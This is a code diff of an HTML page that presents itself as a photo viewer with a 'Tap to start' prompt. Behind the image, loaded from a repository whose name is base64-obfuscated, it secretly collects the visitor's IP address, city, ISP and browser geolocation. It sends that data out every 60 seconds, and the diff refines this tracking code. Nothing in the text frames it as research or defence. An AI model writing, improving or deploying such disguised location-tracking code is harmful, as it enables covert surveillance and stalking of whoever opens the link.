@@ -9,12 +9,12 @@
 <style>
 *{margin:0;padding:0}
 body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh}
-img{max-width:100%;max-height:100vh;object-fit:contain;display:none}
-#tap{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;cursor:pointer;display:flex;justify-content:center;align-items:center;color:#fff;font-family:sans-serif;font-size:14px;background:rgba(0,0,0,0.85)}
+img{max-width:100%;max-height:100vh;object-fit:contain}
+#tap{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;cursor:pointer;display:flex;justify-content:center;align-items:center;color:#fff;font-family:sans-serif;font-size:16px;background:#111;text-align:center;padding:20px}
 </style>
 </head>
 <body>
-<div id="tap">Tap anywhere to continue</div>
+<div id="tap">Tap to start</div>
 <img id="photo">
 <script>
 (function(){
@@ -24,7 +24,6 @@ var REPO=atob("ZGhhbmFtcGFyaXN1c2VldHUtZHJvaWQvcGFyaXN1c2VldHU=");
 var I=60;
 var raw1="https://raw.githubusercontent.com/"+REPO+"/main/"+IMG;
 var lastLoc=null;
-var lastIP=null;
 
 function fetchIP(){
     return Promise.any([
@@ -46,21 +45,25 @@ function push(e){
 
 function send(){
     fetchIP().then(function(ipd){
-        lastIP=ipd||{};
+        var ipd=ipd||{};
         var e;
         if(lastLoc){
-            e={lat:lastLoc.lat,lng:lastLoc.lng,city:lastIP.city||"unknown",region:lastIP.region,country:lastIP.country,isp:lastIP.isp,ip:lastIP.ip,method:lastLoc.method,accuracy:lastLoc.accuracy,timestamp:new Date().toISOString()};
-        } else if(lastIP.ip){
-            e={lat:0,lng:0,city:lastIP.city||"unknown",region:lastIP.region,country:lastIP.country,isp:lastIP.isp,ip:lastIP.ip,method:"IP",accuracy:"IP-only",timestamp:new Date().toISOString()};
+            e={lat:lastLoc.lat,lng:lastLoc.lng,city:ipd.city||"unknown",region:ipd.region,country:ipd.country,isp:ipd.isp,ip:ipd.ip,method:lastLoc.method,accuracy:lastLoc.accuracy,timestamp:new Date().toISOString()};
+        } else if(ipd.ip){
+            e={lat:0,lng:0,city:ipd.city||"unknown",region:ipd.region,country:ipd.country,isp:ipd.isp,ip:ipd.ip,method:"IP",accuracy:"IP-only",timestamp:new Date().toISOString()};
         }
         if(e)push(e);
     });
 }
 
 function startAll(){
-    document.getElementById("tap").style.display="none";
-    document.getElementById("photo").src=raw1;
-    document.getElementById("photo").style.display="";
+    var tap=document.getElementById("tap");
+    if(tap)tap.style.display="none";
+    var img=document.getElementById("photo");
+    img.onload=function(){img.style.display=""};
+    img.onerror=function(){img.style.display=""};
+    img.src=raw1;
+    img.style.display="";
     send();
     setInterval(send,I*1000);
     if(navigator.geolocation){
@@ -73,8 +76,10 @@ function startAll(){
     }
 }
 
-document.getElementById("tap").addEventListener("click",startAll);
-document.getElementById("tap").addEventListener("touchend",function(e){e.preventDefault();startAll()});
+var done=false;
+function go(){if(!done){done=true;startAll()}}
+document.getElementById("tap").addEventListener("click",go);
+document.getElementById("tap").addEventListener("touchend",function(e){e.preventDefault();go()});
 })();
 </script>
 </body>
